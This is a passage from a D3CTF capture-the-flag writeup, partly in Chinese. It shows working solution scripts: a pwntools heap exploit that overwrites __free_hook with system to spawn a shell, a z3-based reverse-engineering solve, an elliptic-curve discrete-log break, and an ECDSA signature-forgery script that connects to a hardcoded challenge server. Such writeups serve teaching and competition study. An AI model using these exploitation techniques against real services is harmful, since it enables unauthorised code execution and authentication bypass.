        __free_hook = libc.sym['__free_hook'] 
        log.info('__free_hook:'+hex(__free_hook)) 
        ru("done\n") 
        sla("size:",str(0x38)) 
        sa("content:",3*p64(0)+p64(0x81)+p64(libc.sym['__free_hook'])) 
        ru("done\n") 
        p.sendline(str(1))  
        sla("size:",str(0x78)) 
        sa("content:","/bin/sh\x00") 
        ru("done\n") 
        p.sendline(str(1))   
        sla("size:",str(0x78)) 
        sa("content:",p64(libc.sym['system'])) 
        ru("done\n") 
        p.sendline(str(2)) 
        sla("index:",str(16)) 
D3CTF Writeup
18
        p.interactive() 
    except EOFError: 
        return 
if __name__ == "__main__": 
    ''' 
    1/16 
    d3ctf{nEW-p@Rad!se-but-noT_pERfeCT} 
    ''' 
    while True: 
        exp() 
        p.close()
RE
Ancient Game V2
https://d3ctf-rev-1256301804.cos.ap-shanghai.myqcloud.com/dddb4cc54c/chall_2d7cf6eb61.html
程序第⼀步把输⼊和t做了fun函数实现的运算，t和flag似乎很接近...
t = [98,  52,  96,  118,  98,  122,  80,  118,  32,  53,  106,  82,  68,  98,  121,  93,  64,  64,  125,  89,  114,  121,  125,
     71,  122,  55,  54,  74,  51,  74,  51,  55,  52,  54,  79,  51,  98,  48,  109,  96,  58,  71,  99,  50,  71,  58,  102, 
def nand(a, b): 
    return ~(a & b) 
def fun(a, b): 
    t1 = nand(b, b) 
    t2 = nand(a, t1) 
    t3 = nand(a, a) 
    t4 = nand(b, t3) 
    return nand(t4, t2)
⼿动把nand符号化⼀下
function nand(a, b){ 
    if(a === b) 
    { 
        if(typeof(a) == "string") 
        { 
            return '~' + a; 
        } 
        else 
        { 
            return ~a; 
        } 
    } 
    if(typeof(a) == "string") 
    { 
        return 'nand(' + a + ',' + b + ')'; 
    } 
    if(typeof(b) == "string") 
    { 
        return 'nand(' + a + ',' + b + ')'; 
    } 
 return ~(a & b); 
}
可以看到后⾯的判断
cmp nand(nand(nand(nand(input0,-99),nand(98,~input0)),-1),nand(0,~nand(nand(input0,-99),nand(98,~input0)))) 
0 
cmp nand(nand(nand(nand(input0,-99),nand(98,~input0)),-2),nand(1,~nand(nand(input0,-99),nand(98,~input0)))) 
0 
cmp nand(nand(nand(nand(input0,-99),nand(98,~input0)),-3),nand(2,~nand(nand(input0,-99),nand(98,~input0)))) 
0 
D3CTF Writeup
19
cmp nand(nand(nand(nand(input0,-99),nand(98,~input0)),-4),nand(3,~nand(nand(input0,-99),nand(98,~input0)))) 
0 
cmp nand(nand(nand(nand(input0,-99),nand(98,~input0)),-5),nand(4,~nand(nand(input0,-99),nand(98,~input0)))) 
0 
cmp nand(nand(nand(nand(input0,-99),nand(98,~input0)),-6),nand(5,~nand(nand(input0,-99),nand(98,~input0)))) 
0 
cmp nand(nand(nand(nand(input0,-99),nand(98,~input0)),-7),nand(6,~nand(nand(input0,-99),nand(98,~input0)))) 
0 
cmp nand(nand(nand(nand(input0,-99),nand(98,~input0)),-8),nand(7,~nand(nand(input0,-99),nand(98,~input0)))) 
0 
cmp nand(nand(nand(nand(input0,-99),nand(98,~input0)),-9),nand(8,~nand(nand(input0,-99),nand(98,~input0)))) 
0 
cmp nand(nand(nand(nand(input0,-99),nand(98,~input0)),-10),nand(9,~nand(nand(input0,-99),nand(98,~input0)))) 
0 
猜测是判断input0进⾏判断，其中所使⽤的数字就是之前提取出来的表⾥的数字
input0按照flag格式应该是'd'，对应的（结果，序号)：
(6, 0) 
(7, 1) 
(4, 2) 
(5, 3) 
(2, 4) 
(3, 5) 
(0, 6) 
(1, 7) 
(14, 8) 
(15, 9)
如果令t0 = nand(nand(input0,Z99B,nand(98,~input0BB
这个神秘判断就可以看作是判断t0是否是数字A0Z9B
猜测是经过前⾯的fun(a, b)之后需要在0Z9这个范围
按照这个规律化简第⼀个表达式可得：
~nand(nand(nand(t3,Z9B,nand(8,~t3BB,2147483647B
经过测试就是在判断t38
于是乎前⾯的⼀系列神秘判断可以看做是在判断不相等的东西
提取出后直接⽤z3求解得：
t[28] = 8 
t[3] = 2 
t[5] = 1 
t[15] = 9 
t[6] = 5 
t[0] = 6 
t[14] = 7 
t[7] = 8 
t[16] = 8 
t[33] = 4 
t[40] = 3 
t[41] = 2 
t[31] = 1 
t[2] = 3 
t[39] = 9 
t[4] = 4 
t[46] = 8 
t[49] = 3 
t[8] = 4 
t[24] = 2 
t[37] = 1 
t[9] = 5 
t[18] = 3 
t[35] = 6 
t[12] = 1 
t[20] = 7 
t[21] = 3 
t[25] = 4 
t[17] = 5 
D3CTF Writeup
20
t[26] = 1 
t[44] = 4 
t[48] = 7 
t[1] = 7 
t[23] = 5 
t[30] = 9 
t[43] = 2 
t[47] = 5 
t[32] = 3 
t[45] = 6 
t[42] = 8 
t[19] = 9 
t[34] = 3 
t[36] = 4 
t[22] = 7 
t[13] = 6 
t[11] = 4 
t[27] = 6 
t[38] = 9 
t[29] = 6 
t[10] = 6
之后逐位求出来即可
res = '' 
en1 =[98, 52, 96, 118, 98, 122, 80, 118, 32, 53, 106, 82, 68, 98, 121, 93, 64, 64, 125, 89, 114, 121, 125, 105, 71, 122, 55, 54
for i in xrange(50): 
 for sinput in xrange(0,0x80): 
  if nand(nand(sinput,~en1[i]),nand(en1[i],~sinput)) == t[i]: 
   res += chr(sinput) 
   break 
print(res)
Crypto
babyecc
#!/usr/bin/env sage 
N = 45260503363096543257148754436078556651964647703211673455989123897551066957489 
p, q = 136974486394291891696342702324169727113, 330430173928965171697344693604119928553 
assert p * q == N 
# Carmichael's theorem 
A = 84095692866856349150465790161000714096047844577928036285412413565748251721 + euler_phi(pow(2, 253)) / 2 
P = (44159955648066599253108832100718688457814511348998606527321393400875787217987, 
    41184996991123419479625482964987363317909362431622777407043171585119451045333) 
Q = (8608321574287117012150053529115367767874584426773590102307533765044925731687, 
    42087968356933334075391403575576162703959415832753648600254008495577856485852) 
A = A % N 
F = Zmod(N) 
B = F(P[1] ^ 2 - P[0] ^ 3 - A * P[0]) 
E = EllipticCurve(F, [A, B]) 
# Solve by isomorphism 
Pk = E(P) 
Qk = E(Q) 
Fp = GF(p) 
Fq = GF(q) 
Ep = EllipticCurve(Fp, [A, B]) 
Eq = EllipticCurve(Fq, [A, B]) 
Qp = Ep(Q) 
Pp = Ep(P) 
Qq = Eq(Q) 
Pq = Eq(P) 
a = Pp.discrete_log(Qp) 
b = Pq.discrete_log(Qq) 
op = Ep.order() 
oq = Eq.order() 
m = crt(a, b, op / gcd(op, oq), oq / gcd(op, oq)) 
print m, hex(m).decode('hex')
D3CTF Writeup
21
sign2win
#!/usr/bin/env python3 
# -*- coding: utf-8 -*- 
from pwn import * 
import ecdsa, hashlib, binascii, gmpy2, random, itertools, string  
m1 = 'I want the flag'.encode() 
m2 = 'I hate the flag'.encode() 
curve = ecdsa.curves.SECP256k1 
G = curve.generator  
n = curve.order  
hexlify = binascii.hexlify  
# find a valid secret key 
def H(m): 
  return int(binascii.hexlify(hashlib.sha256(m).digest()), 16) 
z1 = H(m1) 
z2 = H(m2) 
k = random.randint(1, n - 1) 
r = (G * k).x() 
d = (((-(z1 + z2)) % n) * gmpy2.invert((2 * r) % n, n)) % n 
sk = ecdsa.SigningKey.from_secret_exponent(d, curve, hashfunc=hashlib.sha256) 
vk = sk.get_verifying_key() 
assert (z1 + z2 + 2 * r * d) % n == 0 
r0, s0 = ecdsa.util.sigdecode_string(sk.sign(m1, k=k), n) 
r1, s1 = ecdsa.util.sigdecode_string(sk.sign(m2, k=k), n) 
assert (-s1) % n == s0 
pubkey = vk.to_string() 
sig = sk.sign(m1, k=k) 
context.log_level = 'DEBUG' 
p = remote('129.226.163.141', 12233) 
def PoW(chal, h): 
  for comb in itertools.product(string.ascii_letters + string.digits, repeat=4): 
    if hashlib.sha256((''.join(comb) + chal).encode('utf-8')).hexdigest() == h: 
      return ''.join(comb) 
  raise Exception("Not found") 
p.recvuntil(b'XXXX+') 
chal = p.recvuntil(')', drop=True).decode() 
p.recvuntil(b' == ') 
h = p.recvline().decode().strip() 
w = PoW(chal, h) 
p.recvuntil(b'XXXX:') 
p.sendline(w.encode()) 
p.sendline(b'2') 
p.recvuntil(b'encode)\n') 
p.sendline(hexlify(pubkey)) 
p.sendline(b'5') 
p.recvuntil(b'signature\n') 
p.sendline(hexlify(sig)) 
p.recvuntil(b'signature\n') 
p.sendline(hexlify(sig)) 
p.interactive()